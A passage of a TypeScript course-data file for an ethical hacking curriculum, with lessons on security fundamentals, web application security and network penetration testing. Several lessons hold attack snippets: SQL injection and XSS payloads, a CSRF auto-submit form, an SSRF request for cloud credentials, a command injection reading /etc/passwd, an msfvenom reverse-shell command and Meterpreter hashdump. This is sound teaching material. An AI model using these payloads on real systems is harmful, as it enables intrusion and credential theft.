import type { CategoryDef } from '../types';
import { mcq, trueFalse, quiz, lesson, setupLesson } from '../helpers';

export const ethicalHackingCategory: CategoryDef = {
  name: 'Ethical Hacking',
  slug: 'ethical-hacking',
  description: 'Master cybersecurity fundamentals, vulnerability assessment, web exploitation, and network penetration testing.',
  icon: '🛡️',
  color: '#ef4444',
  sortOrder: 5,
  courses: [
    // ━━━━━━━━━━━━━━━━━━━ CYBERSECURITY FOUNDATIONS ━━━━━━━━━━━━━━━━━━━
    {
      title: 'Cybersecurity Foundations',
      slug: 'cybersecurity-foundations',
      description: 'Learn ethical hacking principles — CIA Triad, cryptography, threat modeling, security policies, and OS hardening.',
      difficulty: 'beginner',
      language: 'en',
      estimatedHours: 15,
      resources: [
        { resourceType: 'youtube', title: 'Cybersecurity Course for Beginners', url: 'https://www.youtube.com/watch?v=inWWhr5tnEA', author: 'FreeCodeCamp', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Cybersecurity In 100 Seconds', url: 'https://www.youtube.com/watch?v=sdpxddDzXfE', author: 'Fireship', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'CompTIA Security+ Full Course', url: 'https://www.youtube.com/watch?v=9neDQbLlsC0', author: 'Professor Messer', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Ethical Hacking Full Course — Pass CEH v12', url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE', author: 'Edureka', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Cryptography & Encryption Algorithms Explained', url: 'https://www.youtube.com/watch?v=NuyzuNBFWxQ', author: 'Computerphile', platform: 'YouTube' },
        { resourceType: 'ebook', title: 'NIST Cybersecurity Framework Documentation', url: 'https://www.nist.gov/cyberframework', author: 'NIST' },
        { resourceType: 'article', title: 'OWASP Top 10 Security Vulnerabilities Guide', url: 'https://owasp.org/www-project-top-ten/', author: 'OWASP Foundation' },
        { resourceType: 'cheatsheet', title: 'Cybersecurity Terminology & Cryptography Cheat Sheet', url: 'https://quickref.me/security', author: 'QuickRef' },
        { resourceType: 'article', title: 'SANS Institute Reading Room Papers', url: 'https://www.sans.org/white-papers/', author: 'SANS Institute' },
        { resourceType: 'cheatsheet', title: 'Port Numbers & Protocol Quick Reference', url: 'https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml', author: 'IANA' },
      ],
      modules: [
        {
          title: 'Module 1: CIA Triad & Threat Modeling',
          lessons: [
            setupLesson('Cybersecurity Foundations', 'cybersecurity-foundations', 'bash',
              `1. Set up a Kali Linux VM or VirtualBox sandbox\n2. Verify tools: \`nmap --version\` and \`openssl version\`\n3. Run: \`openssl rand -hex 16\``,
              `openssl rand -hex 16`,
              `openssl rand -hex 16`
            ),
            lesson('The CIA Triad (Confidentiality, Integrity, Availability)', 'cia-triad', `# CIA Triad\n\nConfidentiality (encryption), Integrity (hashing), Availability (uptime/redundancy).`, {
              starterCode: `echo -n "Confidential Message" | sha256sum`,
              solutionCode: `echo -n "Confidential Message" | sha256sum`,
              codeLanguage: 'bash',
              quiz: quiz('CIA Triad Quiz', [
                mcq('What pillar of the CIA Triad ensures data has not been modified by unauthorized parties?', 'Integrity', ['Confidentiality', 'Availability'], 'Integrity guarantees data immutability and accuracy.'),
              ]),
            }),
            lesson('Threat Modeling & STRIDE Framework', 'stride-framework', `# STRIDE Framework\n\nSpoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege.`, {
              starterCode: `# STRIDE Categories\n1. Spoofing -> Authenticate\n2. Tampering -> Integrity Check\n3. Repudiation -> Audit Logs`,
              solutionCode: `# STRIDE Categories`,
              codeLanguage: 'text',
              quiz: quiz('STRIDE Quiz', [
                mcq('What threat category describes pretending to be another user or system?', 'Spoofing', ['Tampering', 'Repudiation'], 'Spoofing involves impersonating identities.'),
              ]),
            }),
            lesson('Symmetric vs Asymmetric Encryption (AES & RSA)', 'cryptography-basics', `# Cryptography\n\nSymmetric (AES, single secret key) vs Asymmetric (RSA/ECC, public-private key pair).`, {
              starterCode: `openssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -pubout -out public.pem`,
              solutionCode: `openssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -pubout -out public.pem`,
              codeLanguage: 'bash',
              quiz: quiz('Cryptography Quiz', [
                trueFalse('In asymmetric encryption, messages encrypted with a public key can only be decrypted by the corresponding private key.', true),
              ]),
            }),
            lesson('Cryptographic Hashes & Salted Password Storage', 'password-hashing', `# Hashing & Salting\n\nUse bcrypt, Argon2, or PBKDF2 with unique salts to prevent rainbow table attacks.`, {
              starterCode: `echo -n "password123+salt_value" | sha256sum`,
              solutionCode: `echo -n "password123+salt_value" | sha256sum`,
              codeLanguage: 'bash',
              quiz: quiz('Hashing Quiz', [
                mcq('Why is a unique "salt" appended to passwords before hashing?', 'To prevent pre-computed Rainbow Table dictionary attacks', ['To compress hashes', 'To speed up login'], 'Salts ensure identical passwords produce unique hash digests.'),
              ]),
            }),
          ]
        },
        {
          title: 'Module 2: Network Security & Protocols',
          lessons: [
            lesson('OSI Model & TCP/IP Protocol Stack', 'osi-model', `# OSI Model\n\n7 Layers: Physical, Data Link, Network (IP), Transport (TCP/UDP), Session, Presentation, Application (HTTP).`, {
              starterCode: `curl -v https://httpbin.org/get`,
              solutionCode: `curl -v https://httpbin.org/get`,
              codeLanguage: 'bash',
              quiz: quiz('OSI Model Quiz', [
                mcq('Which OSI layer handles IP addressing and routing across networks?', 'Layer 3 — Network Layer', ['Layer 2 — Data Link', 'Layer 4 — Transport'], 'Layer 3 manages logical IP routing.'),
              ]),
            }),
            lesson('TLS/SSL Handshake & Public Key Infrastructure (PKI)', 'tls-handshake', `# TLS Handshake\n\nEstablish encrypted HTTPS tunnels via asymmetric key exchange and digital certificate validation.`, {
              starterCode: `openssl s_client -connect google.com:443 -showcerts`,
              solutionCode: `openssl s_client -connect google.com:443 -showcerts`,
              codeLanguage: 'bash',
              quiz: quiz('TLS Handshake Quiz', [
                mcq('What authority validates domain identity in HTTPS certificates?', 'Certificate Authority (CA)', ['DNS Root Server', 'ISP'], 'CAs digitally sign SSL/TLS certificates.'),
              ]),
            }),
            lesson('Common Ports & Protocols (22 SSH, 80 HTTP, 443 HTTPS, 3306 MySQL)', 'common-ports', `# Network Ports\n\nRecognize critical default service ports for port scanning and firewall rules.`, {
              starterCode: `nc -zv 127.0.0.1 22 80 443`,
              solutionCode: `nc -zv 127.0.0.1 22 80 443`,
              codeLanguage: 'bash',
              quiz: quiz('Ports Quiz', [
                mcq('What default port is used for secure SSH remote terminal access?', '22', ['80', '443'], 'SSH runs on TCP port 22 by default.'),
              ]),
            }),
            lesson('Firewalls & Intrusion Detection Systems (IDS/IPS)', 'firewalls-ids', `# Firewalls & IDS\n\nFilter packets with \`iptables\` or \`ufw\` and detect malicious traffic with Snort or Suricata.`, {
              starterCode: `sudo ufw status\nsudo ufw allow 22/tcp`,
              solutionCode: `sudo ufw status\nsudo ufw allow 22/tcp`,
              codeLanguage: 'bash',
              quiz: quiz('Firewall Quiz', [
                trueFalse('An Intrusion Prevention System (IPS) can actively block malicious packets in real-time.', true),
              ]),
            }),
            lesson('Multi-Factor Authentication (MFA) & OAuth 2.0', 'mfa-oauth', `# Authentication\n\nImplement Time-based One-Time Passwords (TOTP) and OAuth 2.0 delegated authorization.`, {
              starterCode: `# TOTP Formula: HMAC-SHA1(SecretKey, TimeInterval)`,
              solutionCode: `# TOTP Formula: HMAC-SHA1(SecretKey, TimeInterval)`,
              codeLanguage: 'text',
              quiz: quiz('MFA Quiz', [
                mcq('What protocol is widely used for federated third-party login ("Sign in with Google")?', 'OAuth 2.0', ['FTP', 'SNMP'], 'OAuth 2.0 handles delegated authorization.'),
              ]),
            }),
          ]
        },
        {
          title: 'Module 3: OS Hardening & Security Audits',
          lessons: [
            lesson('Linux Security Hardening (`chmod`, `sudoers`, SSH config)', 'linux-hardening', `# OS Hardening\n\nDisable root SSH login, enforce key-based auth in \`/etc/ssh/sshd_config\`, and restrict \`sudoers\`.`, {
              starterCode: `grep "PermitRootLogin" /etc/ssh/sshd_config || echo "PermitRootLogin no"`,
              solutionCode: `grep "PermitRootLogin" /etc/ssh/sshd_config || echo "PermitRootLogin no"`,
              codeLanguage: 'bash',
              quiz: quiz('Linux Hardening Quiz', [
                mcq('Why disable SSH password login in favor of SSH keys?', 'SSH keys are immune to brute-force password guessing attacks', ['Keys use less network', 'Password auth is deprecated'], 'Cryptographic SSH keys eliminate password brute-forcing.'),
              ]),
            }),
            lesson('Vulnerability Scanning with OpenVAS / Nessus', 'vulnerability-scanning', `# Vulnerability Scanning\n\nAutomate system vulnerability detection, CVE mapping, and patch management.`, {
              starterCode: `echo "Scanning target for known CVE vulnerabilities..."`,
              solutionCode: `echo "Scanning target for known CVE vulnerabilities..."`,
              codeLanguage: 'bash',
              quiz: quiz('Vuln Scanning Quiz', [
                mcq('What does CVE stand for in vulnerability management?', 'Common Vulnerabilities and Exposures', ['Central Virus Encryption', 'Critical Vector Entry'], 'CVE is the global standard dictionary of security vulnerabilities.'),
              ]),
            }),
            lesson('Security Logging & SIEM Centralization (ELK Stack)', 'siem-logging', `# SIEM Logging\n\nCollect syslog data and analyze security events with Security Information & Event Management (SIEM).`, {
              starterCode: `tail -f /var/log/auth.log | grep "Failed password"`,
              solutionCode: `tail -f /var/log/auth.log | grep "Failed password"`,
              codeLanguage: 'bash',
              quiz: quiz('SIEM Quiz', [
                trueFalse('SIEM systems aggregate and correlate log events across multiple network servers to detect attacks.', true),
              ]),
            }),
            lesson('Zero Trust Architecture Principles', 'zero-trust', `# Zero Trust\n\n"Never Trust, Always Verify": Enforce micro-segmentation, continuous verification, and least privilege access.`, {
              starterCode: `# Zero Trust Rule: Verify identity & device health on every single API request`,
              solutionCode: `# Zero Trust Rule`,
              codeLanguage: 'text',
              quiz: quiz('Zero Trust Quiz', [
                mcq('What is the core mantra of Zero Trust Security?', 'Never Trust, Always Verify', ['Trust everything behind firewall', 'Passwords never expire'], 'Zero Trust treats internal and external networks as hostile.'),
              ]),
            }),
            lesson('Cybersecurity Foundations Capstone Audit', 'sec-foundations-capstone', `# Security Capstone\n\nPerform a complete security posture audit: Network firewall configuration, SSH hardening, and SSL/TLS verification.`, {
              starterCode: `echo "=== CYBERSECURITY FOUNDATIONS AUDIT COMPLETE ==="`,
              solutionCode: `echo "=== CYBERSECURITY FOUNDATIONS AUDIT COMPLETE ==="`,
              codeLanguage: 'bash',
              quiz: quiz('Security Capstone Quiz', [
                mcq('Which principle dictates granting users only the minimum permissions necessary for their job role?', 'Principle of Least Privilege (PoLP)', ['Principle of Open Access', 'Rule of Default Admin'], 'Least privilege limits blast radius of potential compromises.'),
              ]),
            }),
          ]
        }
      ]
    },

    // ━━━━━━━━━━━━━━━━━━━ WEB APPLICATION SECURITY ━━━━━━━━━━━━━━━━━━━
    {
      title: 'Web Application Security',
      slug: 'web-application-security',
      description: 'Master OWASP Top 10 vulnerabilities — SQL Injection, Cross-Site Scripting (XSS), CSRF, SSRF, and secure coding practices.',
      difficulty: 'intermediate',
      language: 'en',
      estimatedHours: 20,
      resources: [
        { resourceType: 'youtube', title: 'Web Security & OWASP Top 10 Full Course', url: 'https://www.youtube.com/watch?v=2rS_2p7B14Q', author: 'FreeCodeCamp', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'SQL Injection Explained in 100 Seconds', url: 'https://www.youtube.com/watch?v=ciNHn38eyRc', author: 'Fireship', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'XSS (Cross Site Scripting) Tutorial for Beginners', url: 'https://www.youtube.com/watch?v=EoaDgUgS6QA', author: 'PTP / LiveOverflow', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Burp Suite Tutorial for Web App Penetration Testing', url: 'https://www.youtube.com/watch?v=G3YstQ246hc', author: 'NetworkChuck', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'CSRF & SSRF Vulnerabilities Explained', url: 'https://www.youtube.com/watch?v=eWEgUcHPle0', author: 'Rana Khalil', platform: 'YouTube' },
        { resourceType: 'ebook', title: 'PortSwigger Web Security Academy (Free Interactive Labs)', url: 'https://portswigger.net/web-security', author: 'PortSwigger' },
        { resourceType: 'article', title: 'OWASP Cheat Sheet Series', url: 'https://cheatsheetseries.owasp.org/', author: 'OWASP' },
        { resourceType: 'cheatsheet', title: 'Web Hacking & Payload Cheat Sheet', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', author: 'Swisskyrepo' },
        { resourceType: 'article', title: 'OWASP Testing Guide v4.2', url: 'https://owasp.org/www-project-web-security-testing-guide/', author: 'OWASP' },
        { resourceType: 'cheatsheet', title: 'SQL Injection Payload Quick Reference', url: 'https://portswigger.net/web-security/sql-injection/cheat-sheet', author: 'PortSwigger' },
      ],
      modules: [
        {
          title: 'Module 1: SQL Injection (SQLi)',
          lessons: [
            setupLesson('Web Application Security', 'web-application-security', 'bash',
              `1. Set up OWASP Juice Shop or DVWA container\n2. Run: \`docker run -d -p 3000:3000 bkimminich/juice-shop\`\n3. Intercept HTTP requests with Burp Suite or OWASP ZAP`,
              `curl -i http://localhost:3000`,
              `curl -i http://localhost:3000`
            ),
            lesson('Understanding SQL Injection Flaws', 'sqli-basics', `# SQL Injection\n\nUnsanitized input concatenated into SQL queries allows attackers to manipulate query logic: \`' OR '1'='1\`.`, {
              starterCode: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'xxx';`,
              solutionCode: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'xxx';`,
              codeLanguage: 'sql',
              quiz: quiz('SQLi Basics Quiz', [
                mcq('What causes SQL Injection vulnerabilities?', 'Concatenating unescaped user input directly into SQL strings', ['Using PostgreSQL', 'Having duplicate rows'], 'Unsanitized string concatenation enables SQL injection.'),
              ]),
            }),
            lesson('UNION-Based SQL Injection', 'sqli-union', `# UNION Injections\n\nExtract data from arbitrary database tables using \`UNION SELECT null, username, password FROM users--\`.`, {
              starterCode: `SELECT id, name FROM products WHERE category = 'tech' UNION SELECT username, password FROM users--;`,
              solutionCode: `SELECT id, name FROM products WHERE category = 'tech' UNION SELECT username, password FROM users--;`,
              codeLanguage: 'sql',
              quiz: quiz('UNION SQLi Quiz', [
                mcq('What rule must be satisfied for a UNION SELECT injection to work?', 'The injected query must return the exact same number and types of columns', ['The table names must match', 'The database must be MySQL'], 'UNION queries require identical column counts.'),
              ]),
            }),
            lesson('Blind & Time-Based SQL Injection', 'sqli-blind', `# Blind SQL Injection\n\nExtract data bit-by-bit using boolean true/false responses or delays: \`AND (SELECT SLEEP(5))\`.`, {
              starterCode: `SELECT * FROM items WHERE id = 1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a';`,
              solutionCode: `SELECT * FROM items WHERE id = 1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a';`,
              codeLanguage: 'sql',
              quiz: quiz('Blind SQLi Quiz', [
                trueFalse('Blind SQL Injection occurs when the application does not print database error messages or output directly in the HTTP response.', true),
              ]),
            }),
            lesson('Defending against SQLi: Prepared Statements', 'sqli-defense', `# SQLi Defense\n\nAlways use Parameterized Queries / Prepared Statements: \`db.query('SELECT * FROM users WHERE id = $1', [id])\`.`, {
              starterCode: `// SECURE PARAMETERIZED QUERY\nconst query = "SELECT * FROM users WHERE email = $1";\nawait client.query(query, [userEmail]);`,
              solutionCode: `const query = "SELECT * FROM users WHERE email = $1";\nawait client.query(query, [userEmail]);`,
              codeLanguage: 'javascript',
              quiz: quiz('SQLi Defense Quiz', [
                mcq('What is the single most effective defense against SQL Injection?', 'Parameterized Queries / Prepared Statements', ['Filtering single quotes manually', 'Base64 encoding input'], 'Prepared statements separate SQL logic from data input entirely.'),
              ]),
            }),
          ]
        },
        {
          title: 'Module 2: Cross-Site Scripting (XSS) & CSRF',
          lessons: [
            lesson('Reflected XSS Vulnerabilities', 'xss-reflected', `# Reflected XSS\n\nAttacker-supplied scripts reflected in search parameters execute inside victim browsers: \`<script>alert(document.cookie)</script>\`.`, {
              starterCode: `// VULNERABLE CODE\ndocument.getElementById('output').innerHTML = location.search;`,
              solutionCode: `document.getElementById('output').innerText = location.search;`,
              codeLanguage: 'javascript',
              quiz: quiz('Reflected XSS Quiz', [
                mcq('Where does a Reflected XSS payload originate?', 'From the immediate HTTP request (URL parameters or form inputs)', ['Stored permanently in database', 'From server file system'], 'Reflected XSS reflects input back in the immediate response.'),
              ]),
            }),
            lesson('Stored XSS & DOM-Based XSS', 'xss-stored-dom', `# Stored & DOM XSS\n\nStored XSS persists payload in database (e.g. comment section). DOM XSS mutates client DOM unsafely.`, {
              starterCode: `// SECURE DOM INSERTION\nelement.textContent = userInput; // Safe against XSS!`,
              solutionCode: `element.textContent = userInput;`,
              codeLanguage: 'javascript',
              quiz: quiz('Stored XSS Quiz', [
                mcq('Why is Stored XSS particularly dangerous?', 'It executes automatically for every user who views the infected page', ['It deletes database logs', 'It bypasses firewalls'], 'Stored XSS impacts all visitors who load the stored content.'),
              ]),
            }),
            lesson('Preventing XSS: Content Security Policy (CSP) & HTML Escaping', 'xss-defense-csp', `# XSS Defenses\n\nContext-aware HTML escaping (\`DOMPurify\`) and HTTP header Content Security Policy (\`CSP\`).`, {
              starterCode: `// CSP Header Example\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com`,
              solutionCode: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com`,
              codeLanguage: 'http',
              quiz: quiz('XSS Defense Quiz', [
                mcq('What HTTP header restricts which domain sources can execute JavaScript scripts?', 'Content-Security-Policy (CSP)', ['X-Frame-Options', 'Access-Control-Allow-Origin'], 'CSP dictates trusted script execution origins.'),
              ]),
            }),
            lesson('Cross-Site Request Forgery (CSRF)', 'csrf-attacks', `# CSRF Attacks\n\nTrick logged-in victim browser into submitting unwanted HTTP state-changing requests to a target site.`, {
              starterCode: `<form action="https://bank.com/transfer" method="POST">\n  <input type="hidden" name="amount" value="1000">\n</form>\n<script>document.forms[0].submit();</script>`,
              solutionCode: `<form action="https://bank.com/transfer" method="POST">`,
              codeLanguage: 'html',
              quiz: quiz('CSRF Quiz', [
                trueFalse('CSRF relies on browser automatically sending session cookies with cross-site requests.', true),
              ]),
            }),
            lesson('Defending against CSRF: Anti-CSRF Tokens & SameSite Cookies', 'csrf-defense', `# CSRF Defenses\n\nUse unique anti-CSRF synchronizer tokens and set cookie attribute \`SameSite=Strict\` or \`Lax\`.`, {
              starterCode: `Set-Cookie: session=xyz123; Secure; HttpOnly; SameSite=Strict`,
              solutionCode: `Set-Cookie: session=xyz123; Secure; HttpOnly; SameSite=Strict`,
              codeLanguage: 'http',
              quiz: quiz('CSRF Defense Quiz', [
                mcq('Which cookie attribute prevents cross-site requests from sending session cookies?', 'SameSite=Strict (or Lax)', ['HttpOnly', 'Path=/'], '`SameSite=Strict` blocks cookie transmission on cross-site requests.'),
              ]),
            }),
          ]
        },
        {
          title: 'Module 3: Advanced Web Exploitation & APIs',
          lessons: [
            lesson('Server-Side Request Forgery (SSRF)', 'ssrf-attacks', `# SSRF\n\nAbuse vulnerable server features to force internal network HTTP requests (e.g. cloud metadata \`169.254.169.254\`).`, {
              starterCode: `POST /fetch-url\n{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`,
              solutionCode: `POST /fetch-url`,
              codeLanguage: 'json',
              quiz: quiz('SSRF Quiz', [
                mcq('What cloud metadata IP address is commonly targeted in AWS SSRF attacks?', '169.254.169.254', ['127.0.0.1', '192.168.1.1'], '`169.254.169.254` serves cloud instance metadata in AWS.'),
              ]),
            }),
            lesson('Broken Object Level Authorization (BOLA / IDOR)', 'idor-bola', `# BOLA / IDOR\n\nInsecure Direct Object Reference: Modifying IDs in requests (\`GET /api/users/102\`) accesses other users' data.`, {
              starterCode: `// SECURE AUTHORIZATION CHECK\nif (request.user.id !== resource.ownerId) {\n  throw new ForbiddenError("Access denied");\n}`,
              solutionCode: `if (request.user.id !== resource.ownerId) { throw new ForbiddenError("Access denied"); }`,
              codeLanguage: 'javascript',
              quiz: quiz('IDOR Quiz', [
                mcq('What vulnerability ranked #1 in the OWASP API Top 10 list?', 'BOLA / IDOR (Broken Object Level Authorization)', ['SQL Injection', 'XSS'], 'BOLA / IDOR is the most widespread API security vulnerability.'),
              ]),
            }),
            lesson('Command Injection Vulnerabilities', 'command-injection', `# Command Injection\n\nConcatenating unsanitized user input into system shell calls: \`system("ping " + user_input)\`.`, {
              starterCode: `// VULNERABLE: system("ping 8.8.8.8; cat /etc/passwd")`,
              solutionCode: `// Use fixed API arguments without shell interpolation`,
              codeLanguage: 'javascript',
              quiz: quiz('Command Injection Quiz', [
                trueFalse('Command Injection allows attackers to execute arbitrary operating system commands on the host server.', true),
              ]),
            }),
            lesson('Security Headers (HSTS, X-Frame-Options, CORS)', 'security-headers', `# Security Headers\n\nConfigure \`Strict-Transport-Security\` (HSTS), \`X-Frame-Options: DENY\` (Clickjacking defense), and CORS rules.`, {
              starterCode: `Strict-Transport-Security: max-age=31536000; includeSubDomains\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff`,
              solutionCode: `Strict-Transport-Security: max-age=31536000; includeSubDomains`,
              codeLanguage: 'http',
              quiz: quiz('Security Headers Quiz', [
                mcq('Which HTTP header protects applications against Clickjacking attacks?', 'X-Frame-Options: DENY', ['X-XSS-Protection', 'Server'], '`X-Frame-Options: DENY` prevents rendering inside `<frame>` or `<iframe>`.'),
              ]),
            }),
            lesson('Web Security Capstone: Penetration Audit of Vulnerable App', 'web-sec-capstone', `# Web Security Capstone\n\nAudit a target application using Burp Suite: Identify SQLi, XSS, CSRF, and BOLA bugs, and document remediation.`, {
              starterCode: `echo "=== WEB APPLICATION PENETRATION AUDIT COMPLETE ==="`,
              solutionCode: `echo "=== WEB APPLICATION PENETRATION AUDIT COMPLETE ==="`,
              codeLanguage: 'bash',
              quiz: quiz('Web Sec Capstone Quiz', [
                mcq('What is the best defense-in-depth approach for web security?', 'Combining Input Validation + Parameterized Queries + Contextual Output Encoding + CSP', ['Relying solely on firewall', 'Hiding URLs'], 'Defense-in-depth applies multiple layering controls.'),
              ]),
            }),
          ]
        }
      ]
    },

    // ━━━━━━━━━━━━━━━━━━━ NETWORK PENETRATION TESTING ━━━━━━━━━━━━━━━━━━━
    {
      title: 'Network Penetration Testing',
      slug: 'network-penetration-testing',
      description: 'Master reconnaissance, scanning with Nmap, exploitation with Metasploit, privilege escalation, and wireless hacking.',
      difficulty: 'advanced',
      language: 'en',
      estimatedHours: 25,
      resources: [
        { resourceType: 'youtube', title: 'Network Penetration Testing Full Course', url: 'https://www.youtube.com/watch?v=3FNYvj2U0HM', author: 'The Cyber Mentor (Heath Adams)', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Nmap Tutorial for Beginners — Network Scanning', url: 'https://www.youtube.com/watch?v=4t4kBkMsDbY', author: 'NetworkChuck', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Metasploit Framework Full Course', url: 'https://www.youtube.com/watch?v=8I_603g6Vig', author: 'David Bombal', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Linux Privilege Escalation Tutorial', url: 'https://www.youtube.com/watch?v=kXi3030z858', author: 'TCM Security', platform: 'YouTube' },
        { resourceType: 'youtube', title: 'Wireshark Packet Analysis Full Tutorial', url: 'https://www.youtube.com/watch?v=OU-A25s67dE', author: 'FreeCodeCamp', platform: 'YouTube' },
        { resourceType: 'ebook', title: 'Nmap Network Scanning Book (Official)', url: 'https://nmap.org/book/', author: 'Gordon "Fyodor" Lyon' },
        { resourceType: 'article', title: 'OffSec OSCW Certification Exam Guide', url: 'https://www.offsec.com/courses/pen-200/', author: 'Offensive Security' },
        { resourceType: 'cheatsheet', title: 'Nmap CLI Commands Cheat Sheet', url: 'https://quickref.me/nmap', author: 'QuickRef' },
        { resourceType: 'article', title: 'PayloadsAllTheThings Reverse Shell Cheat Sheet', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md', author: 'Swisskyrepo' },
        { resourceType: 'cheatsheet', title: 'Metasploit msfconsole Command Reference', url: 'https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/', author: 'OffSec' },
      ],
      modules: [
        {
          title: 'Module 1: Reconnaissance & Nmap Scanning',
          lessons: [
            setupLesson('Network Penetration Testing', 'network-penetration-testing', 'bash',
              `1. Boot Kali Linux\n2. Open terminal\n3. Verify tools: \`nmap --version\`, \`msfconsole -v\`, \`wireshark -v\``,
              `nmap --version\nmsfconsole -v`,
              `nmap --version\nmsfconsole -v`
            ),
            lesson('Passive Reconnaissance & OSINT', 'recon-osint', `# Passive Reconnaissance\n\nGather intelligence without sending traffic to target using OSINT tools (\`whois\`, \`dig\`, \`shodan\`).`, {
              starterCode: `whois example.com\ndig example.com ANY +short`,
              solutionCode: `whois example.com\ndig example.com ANY +short`,
              codeLanguage: 'bash',
              quiz: quiz('Recon Quiz', [
                mcq('What distinguishes passive reconnaissance from active scanning?', 'Passive recon sends zero direct network traffic to the target', ['Passive recon uses Nmap', 'Passive recon requires root'], 'Passive recon relies on third-party OSINT sources.'),
              ]),
            }),
            lesson('Network Port Scanning with Nmap (`nmap -sS`, `-sV`, `-O`)', 'nmap-scanning', `# Nmap Scanning\n\nSYN stealth scan (\`-sS\`), service version detection (\`-sV\`), OS detection (\`-O\`), and script engine (\`-sC\`).`, {
              starterCode: `nmap -sS -sV -O -p- 192.168.1.1`,
              solutionCode: `nmap -sS -sV -O -p- 192.168.1.1`,
              codeLanguage: 'bash',
              quiz: quiz('Nmap Quiz', [
                mcq('What does the `-p-` option specify in Nmap?', 'Scans all 65,535 TCP ports', ['Scans top 100 ports', 'Pauses scan'], '`-p-` scans the entire range of 65,535 ports.'),
              ]),
            }),
            lesson('Nmap Scripting Engine (NSE)', 'nmap-nse', `# Nmap NSE\n\nAutomate vulnerability discovery using NSE scripts: \`nmap --script vuln <target>\`.`, {
              starterCode: `nmap -sV --script=vuln 192.168.1.50`,
              solutionCode: `nmap -sV --script=vuln 192.168.1.50`,
              codeLanguage: 'bash',
              quiz: quiz('NSE Quiz', [
                trueFalse('The Nmap Scripting Engine (NSE) allows executing custom Lua scripts for vulnerability detection.', true),
              ]),
            }),
            lesson('Packet Analysis with Wireshark & Tcpdump', 'wireshark-tcpdump', `# Packet Capture\n\nCapture raw packets with \`tcpdump -i eth0 -w cap.pcap\` and analyze protocol handshakes in Wireshark.`, {
              starterCode: `tcpdump -i eth0 -n "port 80 or port 443" -c 10`,
              solutionCode: `tcpdump -i eth0 -n "port 80 or port 443" -c 10`,
              codeLanguage: 'bash',
              quiz: quiz('Packet Capture Quiz', [
                mcq('Which command-line utility captures live network traffic to pcap files?', 'tcpdump', ['ping', 'nmap'], '`tcpdump` is the classic CLI packet analyzer.'),
              ]),
            }),
          ]
        },
        {
          title: 'Module 2: Exploitation & Metasploit Framework',
          lessons: [
            lesson('Metasploit Architecture (`msfconsole`)', 'metasploit-basics', `# Metasploit\n\nNavigate modules: auxiliary (scanners), exploits, payloads (staged/singles), and post-exploitation modules.`, {
              starterCode: `msfconsole -q\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp`,
              solutionCode: `msfconsole -q\nuse exploit/multi/handler`,
              codeLanguage: 'bash',
              quiz: quiz('Metasploit Quiz', [
                mcq('What module type in Metasploit executes code on target systems to deliver payloads?', 'exploit', ['auxiliary', 'post'], 'Exploit modules leverage vulnerabilities to deliver payloads.'),
              ]),
            }),
            lesson('Generating Shells & Payloads (`msfvenom`)', 'msfvenom-payloads', `# Msfvenom\n\nGenerate custom reverse shell binaries: \`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f elf -o shell.elf\`.`, {
              starterCode: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf`,
              solutionCode: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf`,
              codeLanguage: 'bash',
              quiz: quiz('Msfvenom Quiz', [
                mcq('What is the difference between a Bind Shell and a Reverse Shell?', 'Reverse Shell connects back to attacker listener; Bind Shell opens a listening port on target', ['Bind shell uses SSH', 'Reverse shell requires root'], 'Reverse Shells bypass inbound firewall rules by initiating outbound connections.'),
              ]),
            }),
            lesson('Meterpreter Post-Exploitation & Pivoting', 'meterpreter-pivoting', `# Meterpreter\n\nInteract with compromised hosts: \`sysinfo\`, \`hashdump\`, \`portfwd\`, and pivot through internal subnets using \`autoroute\`.`, {
              starterCode: `# Inside Meterpreter session:\nsysinfo\nhashdump\nportfwd add -l 8080 -p 80 -r 10.1.1.5`,
              solutionCode: `sysinfo\nhashdump`,
              codeLanguage: 'bash',
              quiz: quiz('Meterpreter Quiz', [
                trueFalse('Pivoting allows an attacker to route traffic through a compromised machine to reach isolated internal networks.', true),
              ]),
            }),
            lesson('Linux Privilege Escalation (SUID, Sudo, Kernel)', 'linux-privesc', `# Linux PrivEsc\n\nEscalate permissions from standard user to root: Inspect SUID binaries (\`find / -perm -4000\`), \`sudo -l\`, and misconfigured cron jobs.`, {
              starterCode: `find / -perm -u=s -type f 2>/dev/null\nsudo -l`,
              solutionCode: `find / -perm -u=s -type f 2>/dev/null\nsudo -l`,
              codeLanguage: 'bash',
              quiz: quiz('Linux PrivEsc Quiz', [
                mcq('What special file permission bit allows binaries to execute with file owner privileges?', 'SUID bit (4000)', ['SGID bit', 'Sticky bit'], 'SUID binaries execute with the owner\'s privileges (often root).'),
              ]),
            }),
